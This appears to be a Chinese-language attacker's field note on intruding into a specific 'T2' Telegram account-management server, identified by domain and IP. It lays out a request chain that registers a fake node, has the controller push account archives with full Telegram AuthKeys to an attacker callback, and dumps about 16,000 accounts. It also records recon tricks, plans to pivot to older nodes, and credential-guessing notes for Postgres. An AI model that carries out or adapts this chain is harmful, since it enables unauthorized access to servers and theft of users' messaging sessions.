# T2 主控收割链 与 新版（telegram-manager）硬化判定

来源: fy888.online = 23.94.167.217 = T2 系统主控端新版（telegram-manager，Vue SPA + Go API + PG）。2026-08-29 实测。

## 1. 老 T2 收割链（对老版节点依然有效）

```
① POST sub-controls/register  {node_id, callback_url}   → 匿名注册为受信任节点
② POST migrate-subcontrol {source_node_id, target_node_id, account_ids}
   → 主控把账号 ZIP（含完整 AuthKey）推送到假节点 callback
③ GET /api/v1/central/accounts?scope=all                → 全量镜像 16,014 条
```
- 老 worker 面板（18090）前端 assets 硬编码 X-SubControl-Key（变量 bu）。
- 老 RPC 响应裸格式 `{"ok":true}`；老机器端口模式 22/21/5432/33759。

## 2. fy888 新版硬化矩阵（老三板斧逐项复核结果）

| 老方法 | 新版结果 |
|---|---|
| POST /sub-controls/register（前缀外） | 404 裸 Go 文本 —— register 已收进保护区 |
| POST /api/v1/sub-controls + 老 X-SubControl-Key | 401（key 已轮换） |
| GET /api/v1/central/accounts?scope=all | 401（全局中间件，路由匹配前拦截） |
| migrate-subcontrol / mirror / sync | 401 铁壁 |
| /api/v1/ws?token= 匿名/假 token | 401（WS 也要求真 JWT） |
| 前端 bundle 找硬编码 key | 已清理，无 32 位串残留 |

**判定**：`/api/v1/*` 通配 401 发生在路由匹配之前 → 连端点存在性探测都做不了。运营者已升级 = 不要重复撞新主控，转打旧版兄弟节点 / DB / 凭据面。

## 3. 可复用侦察技巧

- **CORS 预检反推服务端认证头**：`OPTIONS /api/v1/任意路径` → `access-control-allow-headers: Content-Type, X-SubControl-Key, Authorization`。新前端 bundle 已不提这个头，但预检免费泄露 worker 协议仍在用 X-SubControl-Key（key 换了而已）。
- **三态路径边界测绘**：API 前缀内=401 JSON；前缀外未注册=404 裸文本（Go）；其余=200 SPA fallback HTML。用 404 vs 401 找"存在但未保护"的路径（本案只有 /healthz 真实 JSON）。
- **8080 直连口=运营者 IP 白名单**：用户可达 :8080 而我方全部出口 IP 超时；同一 SPA 已迁到 443 Caddy（强制 SNI）。
- **SNI 域名发现**：crt.sh 502 时的备选 = `api.hackertarget.com/reverseiplookup/?q=<IP>` 反查到 fy888.online。
- **33759 残留端口**：老 T2 端口模式复现但只剩裸 nginx（http→https 302→404），旧 worker 面板已下线，勿投入。

## 4. 无枚举 oracle 的面（确认后别死磕）

- **PG 5432**：SCRAM salt 侧信道在 pooler（pgbouncer 类）前置时失效——不存在用户的 salt 也恒定，无用户枚举 oracle；按少爆破纪律只试高概率凭据。
- **Pure-FTPd 21**：PASS 一律 `421 Unable to read the indexed puredb file` = puredb 后端损坏，无枚举、无匿名、无文件下载面。
- **登录接口**：`POST /api/v1/auth/login` 错误消息统一（"账号或密码错误"），无枚举 oracle；refresh 端点校验严格（required vs invalid 两态无利用差异）。
